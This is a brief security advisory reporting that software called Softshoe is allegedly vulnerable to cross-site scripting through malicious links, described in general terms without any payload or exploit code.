Softshoe is allegedly prone to cross-site scripting attacks. An attacker can exploit this issue by creating a malicious link that contains hostile HTML or script code to a site that is hosting the vulnerable software. If such a link is visited, the attacker-supplied code may be rendered in the user's web browser.
